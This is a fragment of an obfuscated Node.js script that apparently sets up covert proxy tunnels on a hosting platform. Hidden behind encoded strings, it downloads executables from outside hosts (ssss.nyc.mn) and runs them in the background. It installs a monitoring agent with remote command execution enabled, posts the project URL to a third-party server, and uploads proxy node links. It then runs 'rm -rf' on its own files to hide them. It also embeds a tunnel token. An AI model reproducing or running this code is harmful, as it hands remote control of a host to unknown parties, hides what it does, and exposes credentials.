_0x2c90bb&&_0x2c90bb['status']===0xc8?(console[_0x4e82b0(_0xfce3cb._0x1a902b)](_0x4e82b0(_0xfce3cb._0x509934)),_0x2c90bb):null;}catch(_0x1b2cdd){return null;}}else return;}}function cleanFiles(){const _0x22aa6b={_0x147397:0x1a8,_0x164991:0x18c,_0x59ea03:0x182},_0x20ddde={_0x1fc061:0x160},_0x5857e7={_0x4412f6:0x160,_0x546808:0x193};setTimeout(()=>{const _0x388c4c=_0x43e9,_0x27e39d=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x27e39d[_0x388c4c(0x1a8)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x27e39d[_0x388c4c(_0x22aa6b._0x147397)](phpPath);process[_0x388c4c(0x1c1)]==='win32'?exec(_0x388c4c(0x16b)+_0x27e39d[_0x388c4c(0x164)]('\x20')+_0x388c4c(_0x22aa6b._0x164991),_0x1ac906=>{const _0x2a32e6=_0x388c4c;console[_0x2a32e6(_0x5857e7._0x4412f6)](),console['log'](_0x2a32e6(_0x5857e7._0x546808)),console[_0x2a32e6(0x1ad)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x27e39d[_0x388c4c(0x164)]('\x20')+_0x388c4c(_0x22aa6b._0x59ea03),_0x16eeca=>{const _0x2d3c2f=_0x388c4c;console[_0x2d3c2f(_0x20ddde._0x1fc061)](),console[_0x2d3c2f(0x1ad)]('App\x20is\x20running'),console[_0x2d3c2f(0x1ad)](_0x2d3c2f(0x195));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x239099={_0x28ef37:0x1ad,_0x425588:0x1f1},_0x17734b=_0x1e4301;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x17734b(_0x239099._0x28ef37)](_0x17734b(0x181));return;}try{const _0x105f63=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x17734b(0x1d6)}});return console[_0x17734b(_0x239099._0x28ef37)]('automatic\x20access\x20task\x20added\x20successfully'),_0x105f63;}catch(_0x593dc4){return console[_0x17734b(0x190)](_0x17734b(_0x239099._0x425588)+_0x593dc4[_0x17734b(0x1bc)]),null;}}async function startserver(){const _0x5f3fd9=_0x1e4301;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x12d45e){console[_0x5f3fd9(0x190)]('Error\x20in\x20startserver:',_0x12d45e);}}startserver()[_0x1e4301(0x18b)](_0x3ec0b3=>{console['error']('Unhandled\x20error\x20in\x20startserver:',_0x3ec0b3);}),app[_0x1e4301(0x1ba)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));function _0x22f6(){const _0x1ed810=['https://ipapi.co/json/','Empowerment\x20failed\x20for\x20','set','\x0a\x20\x20tunnel:\x20','\x0a\x0atrojan://','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0avless://','arm','tunnel.yml','sub','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','TunnelSecret','clear','xtls-rprx-vision','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','8631ofMags','join','util','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','/vmess-argo','NEZHA\x20variable\x20is\x20empty,skip\x20running','?security=tls&sni=','none','del\x20/f\x20/q\x20','forEach','win32','NAME','/vless-argo','\x20-s\x20','https://arm64.ssss.nyc.mn/agent','&fp=firefox&type=ws&host=','--tls','http','660ltRaiw','FILE_PATH','get','SERVER_PORT','toString','utf-8','&path=%2Fvless-argo%3Fed%3D2560#','vless','SUB_PATH','/config.json\x20>/dev/null\x202>&1\x20&','Download\x20','isFile','Skipping\x20adding\x20automatic\x20access\x20task','\x20>/dev/null\x202>&1','stream','web\x20running\x20error:\x20','mkdirSync','Empowerment\x20success\x20for\x20','CFIP','2053','127.0.0.1','block','catch','\x20>\x20nul\x202>&1','split','post','&path=%2Ftrojan-argo%3Fed%3D2560#','error','chmod','CFPORT','App\x20is\x20running','NEZHA_PORT','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','38a4c034-be4a-44ab-a2c5-d8f661049376','https://arm64.ssss.nyc.mn/web','ARGO_DOMAIN','tunnel.json','/tunnel.yml\x20run','amd','/api/delete-nodes','existsSync','443','unlinkSync','exec','\x0aclient_secret:\x20','tls','blackhole','config.json','random','Unknown','charAt','push','Nodes\x20uploaded\x20successfully','UUID','/dev/null','arm64','log','includes','10kwYczg','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','country_code','from','has','nohup\x20','./tmp','ARGO_AUTH','https://amd64.ssss.nyc.mn/bot','422aIkfZO','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','listen','Error\x20reading\x20boot.log:','message','finish','3535630AIolKM','\x20is\x20running','pkill\x20-f\x20\x22[','platform','npm\x20running\x20error:\x20','length','bit.debit.dpdns.org','2087','ARGO_DOMAIN:','\x22\x20>\x20/dev/null\x202>&1','8443','writeFileSync','AUTO_ACCESS','substring','countryCode','/vmess-argo?ed=2560','readdirSync','filter','/trojan-argo','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','PROJECT_URL','\x20already\x20exists','ARGO_PORT','application/json','success','327072MpNxHG','aarch64','text/plain;\x20charset=utf-8','2083','\x20>/dev/null\x202>&1\x20&','xinjiapo','pipe','Content-Type','Error\x20executing\x20command:\x20','8740206GRgLUf','freedom','Error\x20downloading\x20files:','basename','unlink','true','453712gztejO','https+local://8.8.8.8/dns-query','https://amd64.ssss.nyc.mn/v1','statSync','15234VEtciT','http://ip-api.com/json/','stringify','.exe\x20>\x20nul\x202>&1','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','UPLOAD_URL','Add\x20automatic\x20access\x20task\x20faild:\x20','https://amd64.ssss.nyc.mn/web','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://amd64.ssss.nyc.mn/agent','https://arm64.ssss.nyc.mn/v1','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','firefox','fileName','createWriteStream','base64','path','send','readFileSync','\x20-c\x20','map','axios','sub.txt','cdns.doon.eu.org','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','false','match','\x20failed:\x20','data','\x20-p\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','?encryption=none&security=tls&sni=','org','child_process','php\x20running\x20error:\x20','eyJhIjoiNzUzZmIwOWJlZDliZDM0ZmMwZTeyJhIjoiNzUzZmIwOWJlZDliZDM0ZmMwZTVhZGFkZGM0M2FjODMiLCJ0IjoiNWZhMWFkYmEtMDhhZC00OTU2LTk1NzAtMDY2M2VjNDQzMWZjIiwicyI6Ik56STVaVFV3T0RZdE5qTmtaUzAwTUdNeUxUbGtORE10TmpJMllUazRNRGt5TURNMiJ9','response','\x20-c\x20\x22','670555jzEptG','pop','2096','tcp','quic','PORT','config.yaml','boot.log','status','env'];_0x22f6=function(){return _0x1ed810;};return _0x22f6();}
